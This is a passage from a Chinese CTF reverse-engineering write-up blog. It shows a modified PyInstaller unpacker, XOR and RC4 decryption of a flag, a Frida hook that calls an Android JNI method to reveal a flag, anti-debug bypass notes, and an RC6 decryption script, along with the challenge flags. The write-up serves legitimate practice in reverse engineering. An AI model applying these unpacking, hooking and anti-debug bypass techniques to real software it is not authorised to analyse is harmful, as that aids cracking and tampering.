<span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, f.read())<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">try</span>:<br>                (tocPosition,) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, f.read(<span class="hljs-number">4</span>))<br>                f.seek(tocPosition, os.SEEK_SET)<br>                toc = marshal.load(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Unmarshalling failed, saving raw PYZ&#x27;</span>)<br>                f.seek(<span class="hljs-number">0</span>)<br>                <span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, f.read())<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(toc, <span class="hljs-built_in">list</span>):<br>                toc = <span class="hljs-built_in">dict</span>(toc)<br><br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> toc.keys():<br>                ispkg, pos, length = toc[key]<br>                f.seek(pos, os.SEEK_SET)<br>                fileName = key<br>                <span class="hljs-keyword">try</span>:<br>                    fileName = fileName.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br>                fileName = fileName.replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>).replace(<span class="hljs-string">&#x27;.&#x27;</span>, os.path.sep)<br>                <span class="hljs-keyword">if</span> ispkg == <span class="hljs-number">1</span>:<br>                    filePath = os.path.join(dirName, fileName, <span class="hljs-string">&#x27;__init__.pyc&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    filePath = os.path.join(dirName, fileName + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                fileDir = os.path.dirname(filePath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fileDir):<br>                    os.makedirs(fileDir)<br>                <span class="hljs-keyword">try</span>:<br>                    data = f.read(length)<br>                    data = zlib.decompress(data)<br>                    <span class="hljs-variable language_">self</span>._writePyc(filePath, data)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error decompressing &#123;0&#125;, saving raw&#x27;</span>.<span class="hljs-built_in">format</span>(filePath))<br>                    <span class="hljs-variable language_">self</span>._writeRawData(filePath + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Usage: python exp.py &lt;filename&gt;&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    arch = PyInstArchive(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.<span class="hljs-built_in">open</span>():<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.checkFile():<br>        arch.close()<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.getCArchiveInfo():<br>        arch.close()<br>        <span class="hljs-keyword">return</span><br>    arch.parseTOC()<br>    arch.extractFiles()<br>    arch.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Extraction finished. Check the &quot;_extracted&quot; folder for files.&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>提取出来的.raw文件就是没有解包成功部分的初始内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242748.png" alt="img"></p><p>用ida看exe文件的加密方式，sub_1400011F0函数里就是魔改的地方</p><p>解密过程：检查开头“swdd”，去除头， 每 16 字节用 <code>key[j] = 0xAA</code> 异或 ，剩余的逐字节xor， 最后zlib解压</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242154.png" alt="img"></p><p>脚本提取先前提取出为解包的CreackMe&amp;&amp;FxxMe.raw文件处理得到pyc文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><br>key_16 = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xAA</span>]*<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_raw</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-comment"># 检查是否有 &#x27;swdd&#x27; 头</span><br>    <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&#x27;swdd&#x27;</span>):<br>        enc = data[<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        enc = data<br><br>    dec = <span class="hljs-built_in">bytearray</span>()<br>    length = <span class="hljs-built_in">len</span>(enc)<br>    i = <span class="hljs-number">0</span><br><br><br>    <span class="hljs-keyword">while</span> i + <span class="hljs-number">16</span> &lt;= length:<br>        block = enc[i:i+<span class="hljs-number">16</span>]<br>        dec.extend(<span class="hljs-built_in">bytes</span>([block[j] ^ key_16[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]))<br>        i += <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">while</span> i &lt; length:<br>        dec.append(enc[i] ^ <span class="hljs-number">0xAA</span>)<br>        i += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> zlib.decompress(dec)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    raw_file = <span class="hljs-string">&quot;CreackMe&amp;&amp;FxxMe.raw&quot;</span><br>    pyc_file = <span class="hljs-string">&quot;CreackMe&amp;&amp;FxxMe.pyc&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(raw_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        raw_data = f.read()<br><br>    decrypted_data = decrypt_raw(raw_data)<br><br>    pyc_header = <span class="hljs-string">b&#x27;\x55\x0d\x0d\x0a&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pyc_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(pyc_header)<br>        f.write(decrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成，生成 <span class="hljs-subst">&#123;pyc_file&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>反编译得到主要加密内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242502.png" alt="img"></p><p>rc4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    i = j = <span class="hljs-number">0</span><br>    out = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br>target_hex = <span class="hljs-string">&#x27;d29b81e136efc517c2967b863f584baf4b82f710f8869f5a56185cb22a9a25fc&#x27;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(target_hex)<br><br>key = <span class="hljs-string">b&#x27;NSSCTF&#x27;</span><br><br>plaintext = rc4(ciphertext, key)<br><br><span class="hljs-keyword">try</span>:<br>    flag_content = plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    flag_content = plaintext.<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;NSSCTF&#123;&#123;<span class="hljs-subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>NSSCTF{4984aa7eeb8c7fa0709832e364e03989}</p><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="我是谁？！"><a href="#我是谁？！" class="headerlink" title="我是谁？！"></a>我是谁？！</h2><p>看主函数得到flag的逻辑，这里用来验证账号是否有权限，如果有权限就通过 PR.showCND() 方法调用 stringFromJNI() </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242323.png" alt="img"></p><p><code>stringFromJNI()</code> 是 <strong>flag 的来源</strong>。</p><p>主动调用 <code>PR pr = new PR(); pr.stringFromJNI()</code> 就能直接拿到 flag。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242020.png" alt="img"></p><p>这里直接写hook脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PR</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.nss_4th.ad.PR&quot;</span>);<br>    <span class="hljs-keyword">var</span> pr = <span class="hljs-variable constant_">PR</span>.$new(); <span class="hljs-comment">// 创建一个 PR 对象</span><br>    <span class="hljs-keyword">var</span> flag = pr.<span class="hljs-title function_">stringFromJNI</span>(); <span class="hljs-comment">// 调用 JNI 方法</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] FLAG = &quot;</span> + flag);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[!] 调用失败: &quot;</span> + e);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242982.png" alt="img"></p><p>NSSCTF{Y3s!NSS_hAs_r34ched_iTs_4th_5nNiv4rsar9}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>磐石行动2025初赛逆向wp</title>
    <link href="/2025/08/16/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82025%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91wp/"/>
    <url>/2025/08/16/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82025%E5%88%9D%E8%B5%9B%E9%80%86%E5%90%91wp/</url>
    
    <content type="html"><![CDATA[<h1 id="磐石行动初赛2025逆向wp"><a href="#磐石行动初赛2025逆向wp" class="headerlink" title="磐石行动初赛2025逆向wp"></a>磐石行动初赛2025逆向wp</h1><h2 id="My-key"><a href="#My-key" class="headerlink" title="My-key"></a>My-key</h2><p>有好几处反调试，可以交叉引用</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749069.png" alt="img"></p><p>调试时改zf</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749337.png" alt="img"></p><p>sub_1400040A0是主函数位置，sub_140003A40是一个主要加密函数，动调的时候可以看到密钥的使用</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749327.png" alt="img"></p><p>sub_140003840是一个自定义的类似tea加密的函数，其实是rc6的加密方式， v37[j] &#x3D; v36[j] ^ *v8;这里是对key的xor</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508230118699.png" alt="img"></p><p>密钥可以通过动调得到，但在函数开头的<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749877.png" alt="img">我们可以通过ResourceHacker工具找到<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749641.png" alt="img"></p><p>  201, “FSZ36f3vU8s5”</p><p>  202, “WcE4Bbm4kHYQsAcX”</p><p>  203, “RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF”</p><p>异或的是WcE4Bbm4kHYQsAcX，密钥FSZ36f3vU8s5，密文RKCTaz+fty1J2qsz4DI6t9bmMiLBxqFrpI70fU4IMemczIlM+z1IoVQobIt1MbXF</p><p>这里给出解密代码，由于最后一步是base64加密，这里先将密文用base64解密得到hex，再进行后续的rc6解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>w = <span class="hljs-number">32</span><br>r = <span class="hljs-number">20</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROTL</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; (y &amp; (w-<span class="hljs-number">1</span>))) | (x &gt;&gt; (w - (y &amp; (w-<span class="hljs-number">1</span>))))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROTR</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &gt;&gt; (y &amp; (w-<span class="hljs-number">1</span>))) | (x &lt;&lt; (w - (y &amp; (w-<span class="hljs-number">1</span>))))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>S_char = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xAA</span>, <br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x5D</span>, <br>    <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x14</span>, <br>    <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x16</span>, <br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x64</span>, <br>    <span class="hljs-number">0x34</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x51</span>, <br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x05</span>, <br>    <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE2</span>, <br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x7C</span>, <br>    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x31</span>, <br>    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xB6</span>, <br>    <span class="hljs-number">0x30</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x98</span>, <br>    <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xFE</span>, <br>    <span class="hljs-number">0x81</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xBA</span>, <br>    <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xB1</span>, <br>    <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5D</span>, <br>    <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC7</span>, <br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x54</span><br>])<br>S = [struct.unpack(<span class="hljs-string">&quot;&lt;I&quot;</span>, S_char[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(S_char)//<span class="hljs-number">4</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc6_decrypt_block</span>(<span class="hljs-params">block</span>):<br>    A, B, C, D = block<br>    C = (C - S[<span class="hljs-number">2</span>*r+<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    A = (A - S[<span class="hljs-number">2</span>*r+<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        A, B, C, D = D, A, B, C<br>        t = ROTL(B * (<span class="hljs-number">2</span>*B + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">5</span>)<br>        u = ROTL(D * (<span class="hljs-number">2</span>*D + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>, <span class="hljs-number">5</span>)<br>        C = ROTR((C - S[<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, t) ^ u<br>        A = ROTR((A - S[<span class="hljs-number">2</span>*i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, u) ^ t<br>    D = (D - S[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    B = (B - S[<span class="hljs-number">0</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> [A, B, C, D]<br><br>data = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x44</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x2d</span>,<br>    <span class="hljs-number">0x49</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0xb7</span>,<br>    <span class="hljs-number">0xd6</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x6b</span>,<br>    <span class="hljs-number">0xa4</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xe9</span>,<br>    <span class="hljs-number">0x9c</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xa1</span>,<br>    <span class="hljs-number">0x54</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xc5</span><br>])<br><br>xor_key = <span class="hljs-string">b&quot;WcE4Bbm4kHYQsAcX&quot;</span><br><br>plain = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">16</span>):<br>    block = struct.unpack(<span class="hljs-string">&quot;&lt;4I&quot;</span>, data[i:i+<span class="hljs-number">16</span>])<br>    decrypted = rc6_decrypt_block(block)<br>    plain += struct.pack(<span class="hljs-string">&quot;&lt;4I&quot;</span>, *decrypted)<br><br><br>plain = <span class="hljs-built_in">bytearray</span>(plain)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    plain[j] ^= xor_key[j]<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>, <span class="hljs-number">48</span>):<br>    plain[j] ^= data[j-<span class="hljs-number">16</span>]<br><br><span class="hljs-built_in">print</span>(plain.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>flag{68f25cc8-1a9f-40e8-ac3b-a85982a52f8f}</p><h2 